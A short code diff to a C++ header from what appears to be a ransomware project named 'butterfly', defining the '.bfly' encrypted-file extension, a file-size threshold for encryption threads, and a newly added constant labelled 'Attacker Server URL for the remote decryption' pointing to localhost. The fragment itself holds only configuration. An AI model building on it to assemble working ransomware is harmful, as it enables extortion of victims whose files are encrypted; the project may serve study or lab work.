@@ -25,6 +25,9 @@ const std::string ENC_BFLY_FILE_ENDING       = ".bfly";                         
 // If a file is greater than this value, new enc thread is created
 const double MAX_FILE_SIZE                   = 100.0;                                 // in MByte
 
+// Attacker Server URL for the remote decryption
+const std::string REMOTE_DECRYPTION_URL      = "http://localhost:5000/decryption/";
+
 } // namespace butterfly
 
 #endif //BUTTERFLY_BFLYPARAMS_H
